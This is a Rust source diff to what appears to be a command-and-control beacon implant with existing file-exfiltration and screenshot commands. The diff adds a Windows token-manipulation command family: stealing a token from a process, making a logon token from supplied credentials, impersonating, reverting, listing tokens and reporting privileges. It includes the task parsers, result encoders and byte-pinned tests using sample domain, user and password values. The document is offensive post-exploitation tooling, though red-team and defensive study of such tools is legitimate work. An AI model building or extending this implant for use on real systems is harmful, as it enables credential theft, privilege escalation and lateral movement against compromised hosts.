@@ -147,6 +147,17 @@ pub const COMMAND_EXFIL: u32 = 35;
 /// buffer at task time, then streams the BMP across cycles exactly like a
 /// download (the POST body frame is 0x12000, a full-screen BMP is ~7 MiB).
 pub const COMMAND_SCREENSHOT: u32 = 44;
+/// Token manipulation (free ids in the native numbering — the 48-61 range
+/// is unused by beacon_agent; 50/51 are the BOF pair). Port of the native
+/// token.c: steal/make/impersonate/revert/list/remove/getuid/privs.
+pub const COMMAND_TOKEN_STEAL: u32 = 52;
+pub const COMMAND_TOKEN_MAKE: u32 = 53;
+pub const COMMAND_TOKEN_IMPRS: u32 = 54;
+pub const COMMAND_TOKEN_REVERT: u32 = 55;
+pub const COMMAND_TOKEN_LIST: u32 = 56;
+pub const COMMAND_TOKEN_REMOVE: u32 = 57;
+pub const COMMAND_TOKEN_GETUID: u32 = 58;
+pub const COMMAND_TOKEN_PRIVS: u32 = 59;
 /// Screenshot stream states (COMMAND_SCREENSHOT result byte).
 pub const SCREENSHOT_START: u8 = 1;
 pub const SCREENSHOT_CONTINUE: u8 = 2;
@@ -189,6 +200,8 @@ pub const COMMAND_ERROR: u32 = 0x1111_FFFF;
 
 /// Longest path the beacon carries (MAX_PATH); one buffer per task.
 pub const PATH_CAP: usize = 260;
+/// Longest credential field of `tkn make` (the native token.c caps at 128).
+pub const TOKEN_FIELD_CAP: usize = 128;
 
 /// A parsed server task (the commands the beacon can delimit and execute;
 /// anything else in the pack stops the parse — the server keeps unprocessed
@@ -257,6 +270,31 @@ pub enum Task {
     Exfil { action: u8, file_id: u32 },
     /// `COMMAND_SCREENSHOT`: capture the screen (no arguments).
     Screenshot,
+    /// `COMMAND_TOKEN_STEAL` with the target pid.
+    TokenSteal { pid: u32 },
+    /// `COMMAND_TOKEN_MAKE` with the logon type and the credentials
+    /// (ACP bytes, pack-string each).
+    TokenMake {
+        logon_type: u32,
+        domain_len: u16,
+        domain: [u8; TOKEN_FIELD_CAP],
+        user_len: u16,
+        user: [u8; TOKEN_FIELD_CAP],
+        pass_len: u16,
+        pass: [u8; TOKEN_FIELD_CAP],
+    },
+    /// `COMMAND_TOKEN_IMPRS` with the stored token id.
+    TokenImpersonate { token_id: u32 },
+    /// `COMMAND_TOKEN_REVERT`.
+    TokenRevert,
+    /// `COMMAND_TOKEN_LIST`.
+    TokenList,
+    /// `COMMAND_TOKEN_REMOVE` with the stored token id.
+    TokenRemove { token_id: u32 },
+    /// `COMMAND_TOKEN_GETUID`: the identity of the CURRENT (thread) token.
+    TokenGetuid,
+    /// `COMMAND_TOKEN_PRIVS`: the current token's privileges.
+    TokenPrivs,
 }
 
 impl Task {
@@ -292,12 +330,18 @@ impl Task {
 /// PackArray string argument: `u32 LE length (incl. the NUL) || bytes ||
 /// NUL` (the task-arg encoding — not the BE array wire form).
 fn pack_string(r: &mut Reader) -> Option<(u16, [u8; PATH_CAP])> {
+    pack_string_cap::<PATH_CAP>(r)
+}
+
+/// Bounded pack-string parse: the Go `PackArray` string is
+/// `u32 LE len-incl-NUL || bytes || NUL`; the trailing NUL is separator.
+fn pack_string_cap<const CAP: usize>(r: &mut Reader) -> Option<(u16, [u8; CAP])> {
     let len = r.u32_le()? as usize;
-    if len == 0 || len > PATH_CAP {
+    if len == 0 || len > CAP {
         return None;
     }
     let bytes = r.take(len)?;
-    let mut buf = [0u8; PATH_CAP];
+    let mut buf = [0u8; CAP];
     let mut i = 0;
     while i < bytes.len() {
         buf[i] = bytes[i];
@@ -423,6 +467,37 @@ pub fn parse_task(r: &mut Reader) -> Option<(Task, u32)> {
             Task::JobsKill { job_id }
         }
         COMMAND_SCREENSHOT => Task::Screenshot,
+        COMMAND_TOKEN_STEAL => {
+            let pid = r.u32_le()?;
+            Task::TokenSteal { pid }
+        }
+        COMMAND_TOKEN_MAKE => {
+            let logon_type = r.u32_le()?;
+            let (domain_len, domain) = pack_string_cap::<TOKEN_FIELD_CAP>(r)?;
+            let (user_len, user) = pack_string_cap::<TOKEN_FIELD_CAP>(r)?;
+            let (pass_len, pass) = pack_string_cap::<TOKEN_FIELD_CAP>(r)?;
+            Task::TokenMake {
+                logon_type,
+                domain_len,
+                domain,
+                user_len,
+                user,
+                pass_len,
+                pass,
+            }
+        }
+        COMMAND_TOKEN_IMPRS => {
+            let token_id = r.u32_le()?;
+            Task::TokenImpersonate { token_id }
+        }
+        COMMAND_TOKEN_REVERT => Task::TokenRevert,
+        COMMAND_TOKEN_LIST => Task::TokenList,
+        COMMAND_TOKEN_REMOVE => {
+            let token_id = r.u32_le()?;
+            Task::TokenRemove { token_id }
+        }
+        COMMAND_TOKEN_GETUID => Task::TokenGetuid,
+        COMMAND_TOKEN_PRIVS => Task::TokenPrivs,
         _ => return None,
     };
     let id = r.u32_le()?;
@@ -598,6 +673,63 @@ pub fn push_screenshot_continue(w: &mut Writer, task_id: u32, chunk: &[u8]) -> b
 
 pub fn push_screenshot_finish(w: &mut Writer, task_id: u32) -> bool {
     push_result_header(w, task_id, COMMAND_SCREENSHOT) && w.u8(SCREENSHOT_FINISH)
+}
+
+/// TOKEN_STEAL result: `int tokenId || int pid || array domain || array user`
+/// (BE) — the server renders "Token %v stolen from pid %v (%s\%s)".
+pub fn push_token_steal_result(
+    w: &mut Writer,
+    task_id: u32,
+    token_id: u32,
+    pid: u32,
+    domain: &[u8],
+    user: &[u8],
+) -> bool {
+    push_result_header(w, task_id, COMMAND_TOKEN_STEAL)
+        && w.u32(token_id)
+        && w.u32(pid)
+        && w.array(domain)
+        && w.array(user)
+}
+
+/// TOKEN_MAKE result: `int tokenId` (BE).
+pub fn push_token_make_result(w: &mut Writer, task_id: u32, token_id: u32) -> bool {
+    push_result_header(w, task_id, COMMAND_TOKEN_MAKE) && w.u32(token_id)
+}
+
+/// TOKEN impersonate/revert ack: `byte ok` (BE record).
+pub fn push_token_ack(w: &mut Writer, task_id: u32, command_id: u32, ok: bool) -> bool {
+    push_result_header(w, task_id, command_id) && w.u8(u8::from(ok))
+}
+
+/// TOKEN_LIST result: `int count`, then per entry
+/// `int tokenId || int pid || array domain || array user` (BE).
+pub fn push_token_list_header(w: &mut Writer, task_id: u32, count: u32) -> bool {
+    push_result_header(w, task_id, COMMAND_TOKEN_LIST) && w.u32(count)
+}
+
+pub fn push_token_list_entry(
+    w: &mut Writer,
+    token_id: u32,
+    pid: u32,
+    domain: &[u8],
+    user: &[u8],
+) -> bool {
+    w.u32(token_id) && w.u32(pid) && w.array(domain) && w.array(user)
+}
+
+/// TOKEN_GETUID result: `array "DOMAIN\User"` (BE).
+pub fn push_token_getuid_result(w: &mut Writer, task_id: u32, uid: &[u8]) -> bool {
+    push_result_header(w, task_id, COMMAND_TOKEN_GETUID) && w.array(uid)
+}
+
+/// TOKEN_PRIVS result: `int count`, then per entry `byte enabled || array name`.
+pub fn push_token_privs_header(w: &mut Writer, task_id: u32, count: u32) -> bool {
+    push_result_header(w, task_id, COMMAND_TOKEN_PRIVS) && w.u32(count)
+}
+
+pub fn push_token_privs_entry(w: &mut Writer, enabled: bool, name: &[u8]) -> bool {
+    w.u8(u8::from(enabled)) && w.array(name)
 }
 
 /// EXFIL control ack: `int fileId || byte state` — the server renders
@@ -1225,6 +1357,120 @@ mod tests {
         let mut r = Reader::new(&bytes);
         assert_eq!(parse_task(&mut r), Some((Task::Screenshot, 0x4321)));
         assert_eq!(r.remaining(), 0);
+    }
+
+    /// The tkn task family (PackArray semantics: int u32 LE, string
+    /// u32 LE len-incl-NUL).
+    #[test]
+    fn parse_task_token_family() {
+        // steal: 52 || pid 1337 || taskId 1.
+        let bytes = [52u8, 0, 0, 0, 57, 5, 0, 0, 1, 0, 0, 0];
+        let mut r = Reader::new(&bytes);
+        assert_eq!(
+            parse_task(&mut r),
+            Some((Task::TokenSteal { pid: 1337 }, 1))
+        );
+
+        // make: 53 || logonType 2 || "MEGACORP\0" || "doria\0" || "pw\0" || taskId 2.
+        let bytes = [
+            53, 0, 0, 0, // COMMAND_TOKEN_MAKE
+            2, 0, 0, 0, // logonType (interactive)
+            9, 0, 0, 0, b'M', b'E', b'G', b'A', b'C', b'O', b'R', b'P', 0, // domain
+            6, 0, 0, 0, b'd', b'o', b'r', b'i', b'a', 0, // user
+            3, 0, 0, 0, b'p', b'w', 0, // pass
+            2, 0, 0, 0, // taskId
+        ];
+        let mut r = Reader::new(&bytes);
+        let (task, id) = parse_task(&mut r).unwrap();
+        let Task::TokenMake {
+            logon_type,
+            domain_len,
+            domain,
+            user_len,
+            user,
+            ..
+        } = task
+        else {
+            panic!("expected TokenMake");
+        };
+        assert_eq!(id, 2);
+        assert_eq!(logon_type, 2);
+        assert_eq!(&domain[..domain_len as usize], b"MEGACORP");
+        assert_eq!(&user[..user_len as usize], b"doria");
+
+        // impersonate / revert / list / remove / getuid / privs.
+        let bytes = [54, 0, 0, 0, 9, 0, 0, 0, 3, 0, 0, 0];
+        assert_eq!(
+            parse_task(&mut Reader::new(&bytes)),
+            Some((Task::TokenImpersonate { token_id: 9 }, 3))
+        );
+        let bytes = [55, 0, 0, 0, 4, 0, 0, 0];
+        assert_eq!(
+            parse_task(&mut Reader::new(&bytes)),
+            Some((Task::TokenRevert, 4))
+        );
+        let bytes = [56, 0, 0, 0, 5, 0, 0, 0];
+        assert_eq!(
+            parse_task(&mut Reader::new(&bytes)),
+            Some((Task::TokenList, 5))
+        );
+        let bytes = [57, 0, 0, 0, 9, 0, 0, 0, 6, 0, 0, 0];
+        assert_eq!(
+            parse_task(&mut Reader::new(&bytes)),
+            Some((Task::TokenRemove { token_id: 9 }, 6))
+        );
+        let bytes = [58, 0, 0, 0, 7, 0, 0, 0];
+        assert_eq!(
+            parse_task(&mut Reader::new(&bytes)),
+            Some((Task::TokenGetuid, 7))
+        );
+        let bytes = [59, 0, 0, 0, 8, 0, 0, 0];
+        assert_eq!(
+            parse_task(&mut Reader::new(&bytes)),
+            Some((Task::TokenPrivs, 8))
+        );
+    }
+
+    /// Token results, byte-pinned (BE records, array = u32 BE len).
+    #[test]
+    fn token_records_pin_the_wire() {
+        let mut buf = [0u8; 128];
+        let mut w = Writer::new(&mut buf);
+        assert!(push_token_steal_result(
+            &mut w,
+            0x1122_3344,
+            1,
+            1337,
+            b"MEGACORP",
+            b"doria"
+        ));
+        assert!(push_token_make_result(&mut w, 0x1122_3344, 2));
+        assert!(push_token_getuid_result(
+            &mut w,
+            0x1122_3344,
+            b"MEGACORP\\doria"
+        ));
+        assert!(push_token_privs_header(&mut w, 0x1122_3344, 1));
+        assert!(push_token_privs_entry(&mut w, true, b"SeDebugPrivilege"));
+        let expected = hex(concat!(
+            "11223344", // taskId BE
+            "00000034", // COMMAND_TOKEN_STEAL (52) BE
+            "00000001", // tokenId BE
+            "00000539", // pid 1337 BE
+            "00000008",
+            "4d454741434f5250", // domain
+            "00000005",
+            "646f726961",               // user
+            "112233440000003500000002", // taskId BE || 53 BE || tokenId 2
+            "112233440000003a",         // taskId BE || 58 BE
+            "0000000e",
+            "4d454741434f52505c646f726961", // DOMAIN\User
+            "112233440000003b00000001",     // taskId BE || 59 BE || count 1
+            "01",                           // enabled
+            "00000010",
+            "5365446562756750726976696c656765", // SeDebugPrivilege
+        ));
+        assert_eq!(w.written_bytes(), &expected[..]);
     }
 
     /// Screenshot stream records, byte-pinned: START carries the total BMP
